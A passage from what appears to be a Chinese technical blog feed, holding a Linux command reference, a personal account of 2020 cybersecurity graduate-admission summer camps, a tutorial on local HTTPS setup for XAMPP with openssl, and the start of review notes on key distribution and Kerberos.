参数一起使用，可以用来将 top 的结果输出到档案内</p><h4 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h4><p> pstree命令将所有进程以树状图显示，树状图将会以 pid (如果有指定) 或是以 init 这个基本行程为根 (root)，如果有指定使用者 id，则树状图会只显示该使用者所拥有的行程。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">pstree <span class="hljs-selector-attr">[-a]</span> <span class="hljs-selector-attr">[-c]</span> <span class="hljs-selector-attr">[-h|-Hpid]</span> <span class="hljs-selector-attr">[-l]</span> <span class="hljs-selector-attr">[-n]</span> <span class="hljs-selector-attr">[-p]</span> <span class="hljs-selector-attr">[-u]</span> <span class="hljs-selector-attr">[-G|-U]</span> <span class="hljs-selector-attr">[pid|user]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a 显示该行程的完整指令及参数, 如果是被记忆体置换出去的行程则会加上括号<br>-c 如果有重覆的行程名, 则分开列出（预设值是会在前面加上 *）</p><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><p>shutdown命令可以用来进行关机程序，并且在关机以前传送讯息给所有使用者正在执行的程序，shutdown 也可以用来重开机。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">shutdown <span class="hljs-selector-attr">[-t seconds]</span> <span class="hljs-selector-attr">[-rkhncfF]</span> <span class="hljs-selector-tag">time</span> <span class="hljs-selector-attr">[message]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-t seconds : 设定在几秒钟之后进行关机程序。<br>-k : 并不会真的关机，只是将警告讯息传送给所有使用者。<br>-r : 关机后重新开机。<br>-h : 关机后停机。<br>-n : 不采用正常程序来关机，用强迫的方式杀掉所有执行中的程序后自行关机。<br>-c : 取消目前已经进行中的关机动作。<br>-f : 关机时，不做 fcsk 动作(检查 Linux 档系统)。<br>-F : 关机时，强迫进行 fsck 动作。<br>time : 设定关机的时间。<br>message : 传送给所有使用者的警告讯息。</p><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p>usermod命令用于修改用户帐号。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">usermod <span class="hljs-selector-attr">[-LU]</span><span class="hljs-selector-attr">[-c &lt;备注&gt;]</span><span class="hljs-selector-attr">[-d &lt;登入目录&gt;]</span><span class="hljs-selector-attr">[-e &lt;有效期限&gt;]</span><span class="hljs-selector-attr">[-f &lt;缓冲天数&gt;]</span><span class="hljs-selector-attr">[-g &lt;群组&gt;]</span><span class="hljs-selector-attr">[-G &lt;群组&gt;]</span><span class="hljs-selector-attr">[-l &lt;帐号名称&gt;]</span><span class="hljs-selector-attr">[-s &lt;shell&gt;]</span><span class="hljs-selector-attr">[-u &lt;uid&gt;]</span><span class="hljs-selector-attr">[用户帐号]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-c&lt;备注&gt; 　修改用户帐号的备注文字。<br>-d登入目录&gt; 　修改用户登入时的目录。<br>-e&lt;有效期限&gt; 　修改帐号的有效期限。<br>-f&lt;缓冲天数&gt; 　修改在密码过期后多少天即关闭该帐号。<br>-g&lt;群组&gt; 　修改用户所属的群组。<br>-G&lt;群组&gt; 　修改用户所属的附加群组。<br>-l&lt;帐号名称&gt; 　修改用户帐号名称。<br>-L 　锁定用户密码，使密码无效。<br>-s<shell> 　修改用户登入后所使用的shell。<br>-u<uid> 　修改用户ID。<br>-U 　解除密码锁定。</p><h4 id="chsh"><a href="#chsh" class="headerlink" title="chsh"></a>chsh</h4><p>chsh命令用于更改使用者 shell 设定。</p><h4 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h4><p>uname（英文全拼：unix name）命令用于显示系统信息。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">uname <span class="hljs-selector-attr">[-amnrsv]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a或–all 　显示全部的信息。<br>-m或–machine 　显示电脑类型。<br>-n或-nodename 　显示在网络上的主机名称。<br>-r或–release 　显示操作系统的发行编号。<br>-s或–sysname 　显示操作系统名称。<br>-v 　显示操作系统的版本。<br>–help 　显示帮助。<br>–version 　显示版本信息。</p><h4 id="who"><a href="#who" class="headerlink" title="who"></a>who</h4><p> who命令用于显示系统中有哪些使用者正在上面，显示的资料包含了使用者 ID、使用的终端机、从哪边连上来的、上线时间、呆滞时间、CPU 使用量、动作等等。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">who - <span class="hljs-selector-attr">[husfV]</span> <span class="hljs-selector-attr">[user]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-H 或 –heading：显示各栏位的标题信息列；<br>-u 或 –idle：显示闲置时间，若该用户在前一分钟之内有进行任何动作，将标示成”.”号，如果该用户已超过24小时没有任何动作，则标示出”old”字符串；<br>-m：此参数的效果和指定”am i”字符串相同；<br>-q 或–count：只显示登入系统的帐号名称和总人数；<br>-s：此参数将忽略不予处理，仅负责解决who指令其他版本的兼容性问题；<br>-w 或-T或–mesg或–message或–writable：显示用户的信息状态栏；<br>–help：在线帮助；<br>–version：显示版本信息。</p><h4 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h4><p> whoami命令用于显示自身用户名称。<br>显示自身的用户名称，本指令相当于执行”id -un”指令。</p><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>free命令用于显示内存状态。<br>free指令会显示内存的使用情况，包括实体内存，虚拟的交换文件内存，共享内存区段，以及系统核心使用的缓冲区等。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">free <span class="hljs-selector-attr">[-bkmotV]</span><span class="hljs-selector-attr">[-s &lt;间隔秒数&gt;]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-b 　以Byte为单位显示内存使用情况。<br>-k 　以KB为单位显示内存使用情况。<br>-m 　以MB为单位显示内存使用情况。<br>-h 　以合适的单位显示内存使用情况，最大为三位数，自动计算对应的单位值。单位有：<br>B &#x3D; bytes<br>K &#x3D; kilos<br>M &#x3D; megas<br>G &#x3D; gigas<br>T &#x3D; teras<br>-o 　不显示缓冲区调节列。<br>-s&lt;间隔秒数&gt; 　持续观察内存使用状况。<br>-t 　显示内存总和列。<br>-V 　显示版本信息。</p><h3 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h3><h4 id="dircolors"><a href="#dircolors" class="headerlink" title="dircolors"></a>dircolors</h4><p>dircolors命令用于设置 ls 指令在显示目录或文件时所用的色彩</p><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p>crontab是用来定期执行程序的命令。<br>当安装完成操作系统之后，默认便会启动此任务调度命令。<br>crond 命令每分锺会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p><p>语法：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">crontab [ -u <span class="hljs-keyword">user</span> <span class="hljs-title">] &#123; -l</span> | -r | -e &#125;<br></code></pre></td></tr></table></figure><p>参数：</p><p>-e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)<br>-r : 删除目前的时程表<br>-l : 列出目前的时程表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">f1 f2 f3 f4 f5 program<br><span class="hljs-symbol">*</span>    <span class="hljs-symbol">*</span>    <span class="hljs-symbol">*</span>    <span class="hljs-symbol">*</span>    <span class="hljs-symbol">*</span><br>-    -    -    -    -<br>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<br>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    +----- 星期中星期几 (0 - 7) (星期天 为0)</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    +---------- 月份 (1 - 12) </span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">    +--------------- 一个月中的第几天 (1 - 31)</span><br><span class="hljs-string"></span>|<span class="hljs-string">    +-------------------- 小时 (0 - 23)</span><br><span class="hljs-string">+------------------------- 分钟 (0 - 59)</span><br></code></pre></td></tr></table></figure><h4 id="enable"><a href="#enable" class="headerlink" title="enable"></a>enable</h4><p>enable命令用于启动或关闭 shell 内建指令。<br>若要执行的文件名称与shell内建指令相同，可用enable -n来关闭shell内建指令。若不加-n参数，enable可重新启动关闭的指令。</p><h4 id="export"><a href="#export" class="headerlink" title="export"></a>export</h4><p>export 命令用于设置或显示环境变量。<br>在 shell 中执行程序时，shell 会提供一组环境变量。export 可新增，修改或删除环境变量，供后续执行的程序使用。export 的效力仅限于该次登陆操作。</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">export <span class="hljs-comment">[-fnp]</span><span class="hljs-comment">[变量名称]</span>=<span class="hljs-comment">[变量设置值]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-f 　代表[变量名称]中为函数名称。<br>-n 　删除指定的变量。变量实际上并未删除，只是不会输出到后续指令的执行环境中。<br>-p 　列出所有的shell赋予程序的环境变量。</p><h4 id="insmod"><a href="#insmod" class="headerlink" title="insmod"></a>insmod</h4><p>insmod（英文全拼：install module）命令用于载入模块。<br>Linux有许多功能是通过模块的方式，在需要时才载入kernel。如此可使kernel较为精简，进而提高效率，以及保有较大的弹性。这类可载入的模块，通常是设备驱动程序。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">insmod <span class="hljs-selector-attr">[-fkmpsvxX]</span><span class="hljs-selector-attr">[-o &lt;模块名称&gt;]</span><span class="hljs-selector-attr">[模块文件]</span><span class="hljs-selector-attr">[符号名称 = 符号值]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-f 　不检查目前kernel版本与模块编译时的kernel版本是否一致，强制将模块载入。<br>-k 　将模块设置为自动卸除。<br>-m 　输出模块的载入信息。<br>-o&lt;模块名称&gt; 　指定模块的名称，可使用模块文件的文件名。<br>-p 　测试模块是否能正确地载入kernel。<br>-s 　将所有信息记录在系统记录文件中。<br>-v 　执行时显示详细的信息。<br>-x 　不要汇出模块的外部符号。<br>-X 　汇出模块所有的外部符号，此为预设置。</p><h4 id="lsmod"><a href="#lsmod" class="headerlink" title="lsmod"></a>lsmod</h4><p>lsmod（英文全拼：list modules）命令用于显示已载入系统的模块。<br>执行 lsmod 指令，会列出所有已载入系统的模块。Linux 操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放入核心。您可以将这些功能编译成一个个单独的模块，待需要时再分别载入。</p><h4 id="rmmod"><a href="#rmmod" class="headerlink" title="rmmod"></a>rmmod</h4><p>rmmod（英文全拼：remove module）命令用于删除模块。<br>执行 rmmod 指令，可删除不需要的模块。Linux 操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放如核心。你可以将这些功能编译成一个个单独的模块，待有需要时再分别载入它们。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">rmmod <span class="hljs-selector-attr">[-as]</span><span class="hljs-selector-attr">[模块名称...]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a 　删除所有目前不需要的模块。<br>-s 　把信息输出至syslog常驻服务，而非终端机界面。</p><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><p>passwd命令用来更改使用者的密码</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">passwd <span class="hljs-comment">[-k]</span> <span class="hljs-comment">[-l]</span> <span class="hljs-comment">[-u <span class="hljs-comment">[-f]</span>]</span> <span class="hljs-comment">[-d]</span> <span class="hljs-comment">[-S]</span> <span class="hljs-comment">[username]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-d 删除密码<br>-f 强迫用户下次登录时必须修改口令<br>-w 口令要到期提前警告的天数<br>-k 更新只能发送在过期之后<br>-l 停止账号使用<br>-S 显示密码信息<br>-u 启用已被停止的账户<br>-x 指定口令最长存活期<br>-g 修改群组密码<br>指定口令最短存活期<br>-i 口令过期后多少天停用账户</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020网安夏令营保研经验总结</title>
    <link href="/blog/2020/07/27/2020%E7%BD%91%E5%AE%89%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2020/07/27/2020%E7%BD%91%E5%AE%89%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><strong>2020年夏令营工作告一段落，写篇博客总结一下今年参加夏令营的吧，以供学弟学妹们参考。</strong></p><p><img src="/images/fj52.jpg"></p><span id="more"></span><h2 id="0x00准备"><a href="#0x00准备" class="headerlink" title="0x00准备"></a>0x00准备</h2><p>大概从四月份开始，开始复习专业课，主要复习了计网、操作系统、密码学、计算机与网络安全、软件安全。今年因为疫情原因，课程基本都在家上的，空闲的时间也挺多的。</p><p>到了五月份开始，开始各个高校夏令营报名工作，今年由于疫情原因，面试多为线上，因此大佬门都海投，于是我也进行了多个学校的投递，情况如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">夏令营投递：<br><span class="hljs-bullet">- </span>复旦大学网安<br><span class="hljs-bullet">- </span>南京大学计算机<br><span class="hljs-bullet">- </span>上海交大网安<br><span class="hljs-bullet">- </span>中科大网安<br><span class="hljs-bullet">- </span>中科院信工所<br><span class="hljs-bullet">- </span>中科院计算所<br><span class="hljs-bullet">- </span>武汉大学网安<br><span class="hljs-bullet">- </span>东南大学网安<br><span class="hljs-bullet">- </span>华科网安<br>夏令营入营：<br><span class="hljs-bullet">- </span>上海交大网安<br><span class="hljs-bullet">- </span>中科大网安<br><span class="hljs-bullet">- </span>中科院信工所<br><span class="hljs-bullet">- </span>中科院计算所<br><span class="hljs-bullet">- </span>武汉大学网安<br><span class="hljs-bullet">- </span>东南大学网安<br><span class="hljs-bullet">- </span>华科网安<br>夏令营参加：<br><span class="hljs-bullet">- </span>上海交大网安<br><span class="hljs-bullet">- </span>中科大网安<br><span class="hljs-bullet">- </span>武汉大学网安<br></code></pre></td></tr></table></figure><h2 id="0x01联系导师"><a href="#0x01联系导师" class="headerlink" title="0x01联系导师"></a>0x01联系导师</h2><p>6月初的时候想着大家都去联系导师了，我就去联系了一个试试。给上海交大的一个老师发了封邮件，老师回复了，并且成功要到了微信，这个老师还是我电的校友，有点巧合，大家联系导师的时候也可以注意一下这方面，校友最起码印象分就挺好。老师问我要不要跟着他手下的一个项目，这时候肯定不会拒绝的，就跟着组内老师一起做了，由于大学期间也做过好多项目了，这点问题不在话下，可以接手顺利操作。夏令营前基本就联系这一个导师，怕联系多了以后太尴尬，不喜欢放老师鸽子。夏令营前联系导师面试的时候有意想不到的收获哦，老师说不定可以抬你一手（前提是你能力不差，他觉得你可以达到他收的学生标准吧）。</p><p>随后夏令营期间有联系了一个科大老师，因为科大的必须找到老师接收才可以，因此就联系了一个导师，导师也同意接收我了，目前上交结果没出，所以还是做了件不好的事，如果上交过了可能就不会去科大了。</p><h2 id="0x02面试"><a href="#0x02面试" class="headerlink" title="0x02面试"></a>0x02面试</h2><p>今年由于疫情影响，面试基本都是采用网络面试的形式，双机位。</p><h3 id="武大"><a href="#武大" class="headerlink" title="武大"></a>武大</h3><p>武汉大学网安营员大概二百人，面试采用分组网络面试，和上交巧了都是同一天，找老师调了一下顺序。面试内容就是英文面试+专业面试。英语问了两个问题，介绍大学做的项目和为什么选择武大，问题很简单。接下来老师基本都是看我的项目经历问我项目细节，基本都能回答出来，最后老师提了句以后做东西要遵照国际标准，整体面试感觉挺好。最后录取百分之七十给优营，我大概在三十名的样子，拿到了优营。</p><h3 id="上海交大"><a href="#上海交大" class="headerlink" title="上海交大"></a>上海交大</h3><p>上海交大面试在下午，随机抽取幸运观众面试，没有顺序。面试用的中文自我介绍，然后老师问项目细节，问的很详细，考验科研能力，也有好多问题回答不上来。然后老师抽了三个专业课题目提问，通过面试后和同学交流，问题主要包括概率论、线性代数、计算机与网络安全（主要）、密码学等。然后用英文问了我一个简单问题，但是我一时想不出来怎么回答，说了几句后给老师说不是很擅长口语，老师们笑了，说就知道你们会准备英文自我介绍，所以我们就取消了英文自我介绍，最后表达了一下很想来交大，面试就结束了。整体面试感觉不是很好，英文没说好且中途还被怼了，等结果吧，说不定还有老师抬一手呢。据我了解其他人面试貌似也不怎么顺利，因此还是有希望的。</p><h3 id="中科大"><a href="#中科大" class="headerlink" title="中科大"></a>中科大</h3><p>中科大的老师问的问题都很基础，注重基础，不过我遇到的那组老师都特别爱怼人，直到把你问到不会为止，主要问了学过的课程，数据结构，操作系统，线性代数，密码学等等。英语问了一个简单的问题，介绍一下自己的家乡。没怎么问项目的事情，可能科大老师觉得基础比较重要吧。</p><h2 id="0x03去向"><a href="#0x03去向" class="headerlink" title="0x03去向"></a>0x03去向</h2><p>最终上交那边没过，今年上交太难了，缩招加本校保护，我们学院夏令营入营好多就进了两个。最终去向是选择了中国科学技术大学。有一说一，中科大夏令营是所有参加的夏令营中体验最好的。</p><p>————————————————————分割线———————————————————–</p><p>10.11号收到了上海交大的补录通知，最终去了上交，非常不好意思的咕咕咕了科大的老师，但是老师也没有责怪我。由于个人以后不打算做科研，因此选择了机会众多的上海交大，如果想去做科研，科大可能也是个很好的选择，科大的理科很强，学术氛围浓厚。</p>]]></content>
    
    
    
    <tags>
      
      <tag>保研</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XAMPP本地localhost配置HTTPS调试</title>
    <link href="/blog/2020/06/28/XAMPP%E6%9C%AC%E5%9C%B0localhost%E9%85%8D%E7%BD%AEHTTPS%E8%B0%83%E8%AF%95/"/>
    <url>/blog/2020/06/28/XAMPP%E6%9C%AC%E5%9C%B0localhost%E9%85%8D%E7%BD%AEHTTPS%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p><strong>最近在给CKeditor写一个获取location插件的时候，API要求必须使用https连接，于是学习了一下配置本地https调试的流程，记录一下过程</strong></p><p><img src="/images/fj51.jpg"></p><span id="more"></span><h2 id="用openssl生成key和crt文件"><a href="#用openssl生成key和crt文件" class="headerlink" title="用openssl生成key和crt文件"></a>用openssl生成key和crt文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@ubuntu:/opt/lampp/etc/ssl.crt$ sudo openssl req -x509 -nodes -days 36500 -newkey rsa:2048 -keyout ./server.key -out ./server.crt<br>Can<span class="hljs-string">&#x27;t load /home/xin/.rnd into RNG</span><br><span class="hljs-string">139698234061248:error:2406F079:random number generator:RAND_load_file:Cannot open file:../crypto/rand/randfile.c:88:Filename=/home/xin/.rnd</span><br><span class="hljs-string">Generating a RSA private key</span><br><span class="hljs-string">........+++++</span><br><span class="hljs-string">.....................+++++</span><br><span class="hljs-string">writing new private key to &#x27;</span>./server.key<span class="hljs-string">&#x27;</span><br><span class="hljs-string">-----</span><br><span class="hljs-string">You are about to be asked to enter information that will be incorporated</span><br><span class="hljs-string">into your certificate request.</span><br><span class="hljs-string">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="hljs-string">There are quite a few fields but you can leave some blank</span><br><span class="hljs-string">For some fields there will be a default value,</span><br><span class="hljs-string">If you enter &#x27;</span>.<span class="hljs-string">&#x27;, the field will be left blank.</span><br><span class="hljs-string">-----</span><br><span class="hljs-string">Country Name (2 letter code) [AU]:CN</span><br><span class="hljs-string">State or Province Name (full name) [Some-State]:Shandong</span><br><span class="hljs-string">Locality Name (eg, city) []:Zaozhuang</span><br><span class="hljs-string">Organization Name (eg, company) [Internet Widgits Pty Ltd]:</span><br><span class="hljs-string">Organizational Unit Name (eg, section) []:</span><br><span class="hljs-string">Common Name (e.g. server FQDN or YOUR name) []:localhost</span><br><span class="hljs-string">Email Address []:1583810565@qq.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">xin@ubuntu:/opt/lampp/etc/ssl.crt$ sudo mv server.key /opt/lampp/etc/ssl.key</span><br></code></pre></td></tr></table></figure><h2 id="配置apache"><a href="#配置apache" class="headerlink" title="配置apache"></a>配置apache</h2><p>打开&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;extra&#x2F;目录，里面有个httpd-ssl.conf文件，修改以下内容：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">SSLCertificateFile</span> <span class="hljs-string">&quot;/opt/lampp/etc/ssl.crt/server.crt&quot;</span><br>SSLCertificateKeyFile <span class="hljs-string">&quot;/opt/lampp/etc/ssl.key/server.key&quot;</span><br></code></pre></td></tr></table></figure><p>保存后退出（记得用管理员权限）</p><p>httpd.conf也确认一下是否开启了SSL：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Secure (SSL/TLS) connections</span><br><span class="hljs-section">&lt;IfModule ssl_module&gt;</span><br><span class="hljs-comment"># XAMPP</span><br><span class="hljs-section">&lt;IfDefine SSL&gt;</span><br><span class="hljs-attribute">Include</span> etc/extra/httpd-ssl.conf<br><span class="hljs-section">&lt;/IfDefine&gt;</span><br><span class="hljs-section">&lt;/IfModule&gt;</span><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>保研夏令营复习计划-计算机与网络安全</title>
    <link href="/blog/2020/05/17/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    <url>/blog/2020/05/17/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>计算机与网络安全是我们网络空间安全专业最重要的一门专业课之一主要包括网络安全应用、系统安全。</strong></p><p><img src="/images/fj50.jpg"></p><span id="more"></span><h1 id="网络安全应用"><a href="#网络安全应用" class="headerlink" title="网络安全应用"></a>网络安全应用</h1><h2 id="密钥分配和用户认证"><a href="#密钥分配和用户认证" class="headerlink" title="密钥分配和用户认证"></a>密钥分配和用户认证</h2><h3 id="基于对称加密的密钥分配"><a href="#基于对称加密的密钥分配" class="headerlink" title="基于对称加密的密钥分配"></a>基于对称加密的密钥分配</h3><p>AB双方间的密钥分发有下列选择：</p><ul><li>A能够选定密钥并通过物理方法传递给B</li><li>第三方可以选定密钥并通过物理方法传递给A和B</li><li>如果A和B不久前使用过一个密钥，一方能够把使用旧密钥加密的新密钥传递给另一方</li><li>如果AB各自有一个到达第三方C的加密链路，C能够在加密链路上传递密钥给A和B</li></ul><p>前两种要求手动传递密钥。对于链路层来说比较合理，因为每个链路层加密设备只和此链路另一端交换数据。但是对于端对端的加密就很不适用。</p><p>第三种选择对链路层加密和端到端加密都是可能的，但是如果攻击者成功地获得一个密钥，那么接下来的所有密钥都暴露了。就算频繁更改链路层加密密钥，这些更改也应该手工完成。为端到端加密提供密钥，第(4) 种选择更可取。</p><p>第四种会用到两种类型的密钥：</p><ul><li>会话密钥：当两个端系统希望通信，它们建立一个逻辑链接。逻辑链接持续过程中所有用户数据都是用一次性的会话密钥加密。</li><li>永久密钥：永久密钥在实体之间用于分发会话密钥。</li></ul><p>第四种需要一个<strong>密钥分发中心KDC</strong></p><p>一般而言，KDC的操作过程如下。<br>(1)当一个主机A期望与另外一个主机建立连接时，它传送一个连接请求包给KDC。主机A和KDC之间的通信使用一个只有此主机 A和KDC共享的主密钥(master key)加密。<br>(2)如果KDC同意建立连接请求，则它产生一个唯一的一 次性会话密钥。它用主机A与之共享的永久密钥加密这个会话密钥，并把加密后的结果发送给主机A。类似地，它用主机B与之共享的永久密钥加密这个会话密钥，并把加密后的结果发送给主机B。<br>(3) A和B现在可以建立一个逻辑连接并交换消息和数据了，其中所有的消息或数据<br>都使用临时性会话密钥加密。</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos是一种认证服务，这种认证服务作为Athena计划的一个组成部分由MIT开发。Kerberos要解决的问题是:假设在一个 开放的分布式环境中，工作站的用户希望访问分布在网络各处的服务器上面的服务，希望服务器能够将访问权限限制再授权用户范围内，并且能够认证服务请求。在这个环境中，一个工作站无法准确判断它的终端用户以及请求的服务是否合法，特别是存在以下三种威胁：</p><ul><li>用户可能进入一个特定的工作站，并假装成其他用户操作该工作站。</li><li>用户可能改变一个工作站的网络地址，从该机上发送伪造请求</li><li>用户可能监听信息或者使用重放攻击，从而获得服务或者破坏正常操作</li></ul><h4 id="Kerberos4"><a href="#Kerberos4" class="headerlink" title="Kerberos4"></a>Kerberos4</h4><p>a.用于获取票据授权票据的认证服务交换</p><p><img src="/images/Kerberos4-0.png"></p><p><img src="/images/Kerberos4-01.png"></p><p><img src="/images/Kerberos4-02.png"></p><p>b.用于获得服务授权票据的票据授权服务交换</p><p><img src="/images/Kerberos4-1.png"></p><p><img src="/images/Kerberos4-11.png"></p><p>c.为了获取服务而进行的客户端&#x2F;服务器认证交换</p><p><img src="/images/Kerberos4-2.png"></p><p><img src="/images/Kerberos4-21.png"></p><p><img src="/images/Kerberos4-22.png"></p><p>Kerberos概览：</p><p><img src="/images/Kerberos4-3.png"></p><h4 id="Kerberos5"><a href="#Kerberos5" class="headerlink" title="Kerberos5"></a>Kerberos5</h4><p>版本4和版本5的区别：</p><ol><li>加密系统依赖性：版本四需要使用DES，版本五密文中标记上加密类型标识，可以使用任何类型的加密技术。</li><li>互联网协议的依赖性：版本4需要使用互联网协议IP地址，其他的类型不支持，版本五任何类型的网络地址都可使用。</li><li>消息字节排序：版本四自己选择，版本五采用惯例（抽象表示法1 ASN.1 和基本编码规则 BER）</li><li>票据有效期：版本四最长有效期2^8*5分钟，对于有些应用来说太短了。版本五中有明确的开始和结束时间</li><li>认证转发：版本四不允许将发放给一个客户端的证书转发给其他主机，并由其他客户端使用。版本5允许</li><li>域间认证：版本4中，N个域互相操作需要N^2阶的Kerberos-Kerberos关系。版本5中支持一种需要较少关系的方法</li></ol><h3 id="X-509证书"><a href="#X-509证书" class="headerlink" title="X.509证书"></a>X.509证书</h3><h4 id="证书"><a href="#证书" class="headerlink" 